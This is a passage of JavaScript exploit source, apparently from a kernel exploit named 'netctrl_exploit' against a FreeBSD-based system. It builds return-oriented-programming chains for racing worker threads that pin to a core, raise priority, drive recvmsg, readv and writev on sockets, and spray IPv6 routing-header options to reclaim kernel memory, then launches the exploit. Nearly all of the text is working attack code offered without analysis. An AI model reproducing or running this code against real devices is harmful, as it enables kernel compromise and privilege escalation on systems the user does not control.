  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(1)); // CPU_WHICH_TID
  rop.push(gadgets.POP_RDX_RET);
  rop.push(BigInt_Error); // id = -1 (current thread)
  rop.push(gadgets.POP_RCX_RET);
  rop.push(new BigInt(0x10)); // setsize
  rop.push(gadgets.POP_R8_RET);
  rop.push(cpu_mask);
  rop.push(cpuset_setaffinity_wrapper);
  var rtprio_buf = malloc(4);
  write16(rtprio_buf, PRI_REALTIME);
  write16(rtprio_buf.add(2), MAIN_RTPRIO);

  // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(1)); // RTP_SET
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(0)); // lwpid = 0 (current thread)
  rop.push(gadgets.POP_RDX_RET);
  rop.push(rtprio_buf);
  rop.push(rtprio_thread_wrapper);

  // Signal ready - write 1 to ready_signal
  rop.push(gadgets.POP_RDI_RET);
  rop.push(ready_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  var loop_init = rop.length;

  // Read from pipe (blocks here) - read(run_fd, pipe_buf, 1)
  rop.push(gadgets.POP_RDI_RET);
  rop.push(run_fd);
  rop.push(gadgets.POP_RSI_RET);
  rop.push(signal_buf);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(1));
  rop.push(read_wrapper);

  // recvmsg(iov_sock_0, msg, 0)
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(iov_sock_0));
  rop.push(gadgets.POP_RSI_RET);
  rop.push(msg);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(0));
  rop.push(recvmsg_wrapper);

  // Signal done - write 1 to deletion_signal
  rop.push(gadgets.POP_RDI_RET); // pop rdi ; ret
  rop.push(done_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  var loop_end = rop.length;
  var loop_size = loop_end - loop_init;
  // It's gonna loop

  return {
    rop,
    loop_size
  };
}
function uio_readv_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
  var rop = [];
  rop.push(new BigInt(0)); // first element overwritten by longjmp, skip it

  var cpu_mask = malloc(0x10);
  write16(cpu_mask, 1 << MAIN_CORE);

  // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(3)); // CPU_LEVEL_WHICH
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(1)); // CPU_WHICH_TID
  rop.push(gadgets.POP_RDX_RET);
  rop.push(BigInt_Error); // id = -1 (current thread)
  rop.push(gadgets.POP_RCX_RET);
  rop.push(new BigInt(0x10)); // setsize
  rop.push(gadgets.POP_R8_RET);
  rop.push(cpu_mask);
  rop.push(cpuset_setaffinity_wrapper);
  var rtprio_buf = malloc(4);
  write16(rtprio_buf, PRI_REALTIME);
  write16(rtprio_buf.add(2), MAIN_RTPRIO);

  // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(1)); // RTP_SET
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(0)); // lwpid = 0 (current thread)
  rop.push(gadgets.POP_RDX_RET);
  rop.push(rtprio_buf);
  rop.push(rtprio_thread_wrapper);

  // Signal ready - write 1 to ready_signal
  rop.push(gadgets.POP_RDI_RET);
  rop.push(ready_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  var loop_init = rop.length;

  // Read from pipe (blocks here) - read(run_fd, pipe_buf, 1)
  rop.push(gadgets.POP_RDI_RET);
  rop.push(run_fd);
  rop.push(gadgets.POP_RSI_RET);
  rop.push(signal_buf);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(1));
  rop.push(read_wrapper);

  // readv(uio_sock_0, uioIovWrite, UIO_IOV_NUM);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(uio_sock_0));
  rop.push(gadgets.POP_RSI_RET);
  rop.push(uioIovWrite);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(UIO_IOV_NUM));
  rop.push(readv_wrapper);

  // Signal done - write 1 to deletion_signal
  rop.push(gadgets.POP_RDI_RET); // pop rdi ; ret
  rop.push(done_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  var loop_end = rop.length;
  var loop_size = loop_end - loop_init;
  // It's gonna loop

  return {
    rop,
    loop_size
  };
}
function uio_writev_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
  var rop = [];
  rop.push(new BigInt(0)); // first element overwritten by longjmp, skip it

  var cpu_mask = malloc(0x10);
  write16(cpu_mask, 1 << MAIN_CORE);

  // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(3)); // CPU_LEVEL_WHICH
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(1)); // CPU_WHICH_TID
  rop.push(gadgets.POP_RDX_RET);
  rop.push(BigInt_Error); // id = -1 (current thread)
  rop.push(gadgets.POP_RCX_RET);
  rop.push(new BigInt(0x10)); // setsize
  rop.push(gadgets.POP_R8_RET);
  rop.push(cpu_mask);
  rop.push(cpuset_setaffinity_wrapper);
  var rtprio_buf = malloc(4);
  write16(rtprio_buf, PRI_REALTIME);
  write16(rtprio_buf.add(2), MAIN_RTPRIO);

  // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(1)); // RTP_SET
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(0)); // lwpid = 0 (current thread)
  rop.push(gadgets.POP_RDX_RET);
  rop.push(rtprio_buf);
  rop.push(rtprio_thread_wrapper);

  // Signal ready - write 1 to ready_signal
  rop.push(gadgets.POP_RDI_RET);
  rop.push(ready_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  var loop_init = rop.length;

  // Read from pipe (blocks here) - read(run_fd, pipe_buf, 1)
  rop.push(gadgets.POP_RDI_RET);
  rop.push(run_fd);
  rop.push(gadgets.POP_RSI_RET);
  rop.push(signal_buf);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(1));
  rop.push(read_wrapper);

  // writev(uio_sock_1, uioIovRead, UIO_IOV_NUM);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(uio_sock_1));
  rop.push(gadgets.POP_RSI_RET);
  rop.push(uioIovRead);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(UIO_IOV_NUM));
  rop.push(writev_wrapper);

  // Signal done - write 1 to deletion_signal
  rop.push(gadgets.POP_RDI_RET); // pop rdi ; ret
  rop.push(done_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  var loop_end = rop.length;
  var loop_size = loop_end - loop_init;
  // It's gonna loop

  return {
    rop,
    loop_size
  };
}
function ipv6_sock_spray_and_read_rop(ready_signal, run_fd, done_signal, signal_buf) {
  var rop = [];
  rop.push(new BigInt(0)); // first element overwritten by longjmp, skip it

  var cpu_mask = malloc(0x10);
  write16(cpu_mask, 1 << MAIN_CORE);

  // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(3)); // CPU_LEVEL_WHICH
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(1)); // CPU_WHICH_TID
  rop.push(gadgets.POP_RDX_RET);
  rop.push(BigInt_Error); // id = -1 (current thread)
  rop.push(gadgets.POP_RCX_RET);
  rop.push(new BigInt(0x10)); // setsize
  rop.push(gadgets.POP_R8_RET);
  rop.push(cpu_mask);
  rop.push(cpuset_setaffinity_wrapper);
  var rtprio_buf = malloc(4);
  write16(rtprio_buf, PRI_REALTIME);
  write16(rtprio_buf.add(2), MAIN_RTPRIO);

  // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(1)); // RTP_SET
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(0)); // lwpid = 0 (current thread)
  rop.push(gadgets.POP_RDX_RET);
  rop.push(rtprio_buf);
  rop.push(rtprio_thread_wrapper);

  // Signal ready - write 1 to ready_signal
  rop.push(gadgets.POP_RDI_RET);
  rop.push(ready_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  var loop_init = rop.length;

  // Read from pipe (blocks here) - read(run_fd, pipe_buf, 1)
  rop.push(gadgets.POP_RDI_RET);
  rop.push(run_fd);
  rop.push(gadgets.POP_RSI_RET);
  rop.push(signal_buf);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(1));
  rop.push(read_wrapper);

  // Spray all sockets
  for (var i = 0; i < ipv6_socks.length; i++) {
    rop.push(gadgets.POP_RDI_RET);
    rop.push(ipv6_socks[i]);
    rop.push(gadgets.POP_RSI_RET);
    rop.push(new BigInt(IPPROTO_IPV6));
    rop.push(gadgets.POP_RDX_RET);
    rop.push(new BigInt(IPV6_RTHDR));
    rop.push(gadgets.POP_RCX_RET);
    rop.push(spray_rthdr_rop.add(i * UCRED_SIZE)); // Offset for socket i

    // debug("");
    // debug("Using this buffer " + hex(spray_rthdr_rop.add(i*UCRED_SIZE)) + " : " + hex(read64(spray_rthdr_rop.add(i*UCRED_SIZE))));

    rop.push(gadgets.POP_R8_RET);
    rop.push(new BigInt(spray_rthdr_len));
    rop.push(setsockopt_wrapper);
  }

  // After spraying, read all sockets into buffer array
  for (var _i15 = 0; _i15 < ipv6_socks.length; _i15++) {
    rop.push(gadgets.POP_RDI_RET);
    rop.push(ipv6_socks[_i15]);
    // debug("");
    // debug("pushed sock: " + hex(ipv6_socks[i]));
    rop.push(gadgets.POP_RSI_RET);
    rop.push(new BigInt(IPPROTO_IPV6));
    rop.push(gadgets.POP_RDX_RET);
    rop.push(new BigInt(IPV6_RTHDR));
    rop.push(gadgets.POP_RCX_RET);
    rop.push(read_rthdr_rop.add(_i15 * 8)); // Offset for socket i
    // debug("Pushing read from add " + hex(read_rthdr_rop.add(i * 8)));
    rop.push(gadgets.POP_R8_RET);
    rop.push(check_len);
    rop.push(getsockopt_wrapper);
  }

  // Signal done - write 1 to deletion_signal
  rop.push(gadgets.POP_RDI_RET); // pop rdi ; ret
  rop.push(done_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

  // Exit
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(0));
  rop.push(thr_exit_wrapper);

  // It's gonna loop

  return {
    rop,
    loop_size: 0 // loop_size
  };
}
netctrl_exploit();
// cleanup();